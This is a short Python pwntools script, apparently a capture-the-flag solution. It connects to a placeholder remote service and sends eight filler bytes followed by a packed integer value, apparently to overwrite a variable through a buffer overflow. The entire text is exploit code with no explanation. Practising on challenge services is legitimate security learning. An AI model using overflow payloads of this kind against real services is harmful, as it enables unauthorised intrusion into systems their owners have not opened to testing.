from pwn import *
conn = remote('ipaddress', 1984, level = 'debug')
conn.recvline()
payload = 'xxxxxxxx' + '\x39\x05\x00\x00'
conn.sendline(payload)
conn.recvline()
conn.close()